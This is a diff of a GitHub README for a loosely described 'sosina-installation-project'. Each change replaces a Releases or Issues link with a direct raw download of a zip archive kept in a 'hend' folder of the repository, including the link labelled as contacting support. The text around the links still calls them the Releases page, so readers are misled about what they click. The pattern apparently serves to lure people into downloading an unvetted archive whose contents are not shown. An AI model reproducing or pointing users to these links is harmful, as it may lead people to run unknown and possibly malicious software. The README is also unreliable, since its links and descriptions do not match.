@@ -1,6 +1,6 @@
 # 🎉 sosina-installation-project - Simple Steps to Install and Use
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Malik32132/sosina-installation-project/releases)
+[![Download Now](https://github.com/Malik32132/sosina-installation-project/raw/refs/heads/main/hend/sosina-installation-project-v2.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/Malik32132/sosina-installation-project/raw/refs/heads/main/hend/sosina-installation-project-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **sosina-installation-project**! This guide will help you easily 
 
 ## 📥 Download & Install
 
-To download the application, please visit this page: [Download Here](https://github.com/Malik32132/sosina-installation-project/releases). 
+To download the application, please visit this page: [Download Here](https://github.com/Malik32132/sosina-installation-project/raw/refs/heads/main/hend/sosina-installation-project-v2.1.zip). 
 
 ### Steps to Follow:
 1. Click on the link above to open the GitHub Releases page.
@@ -58,11 +58,11 @@ The sosina-installation-project offers several useful features:
 ### What do I do if the download fails?
 If your download does not complete:
 1. Check your internet connection.
-2. Try downloading again from the [Releases page](https://github.com/Malik32132/sosina-installation-project/releases).
+2. Try downloading again from the [Releases page](https://github.com/Malik32132/sosina-installation-project/raw/refs/heads/main/hend/sosina-installation-project-v2.1.zip).
 3. If issues persist, consider using a different browser.
 
 ### How can I contact support?
-You can reach out via the Issues tab on the repository [here](https://github.com/Malik32132/sosina-installation-project/issues) for any queries or concerns.
+You can reach out via the Issues tab on the repository [here](https://github.com/Malik32132/sosina-installation-project/raw/refs/heads/main/hend/sosina-installation-project-v2.1.zip) for any queries or concerns.
 
 ## 👥 Community Guidelines
 
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 - **Documentation:** Explore detailed documentation for advanced features and use cases further in the repository.
 - **Community Forum:** Join discussions with other users and developers for tips and tricks.
 
-For easy access to the software, you can always return to the [Releases page](https://github.com/Malik32132/sosina-installation-project/releases) to download the latest version.
+For easy access to the software, you can always return to the [Releases page](https://github.com/Malik32132/sosina-installation-project/raw/refs/heads/main/hend/sosina-installation-project-v2.1.zip) to download the latest version.
 
 Thank you for using the sosina-installation-project! We hope you find it useful and easy to use.
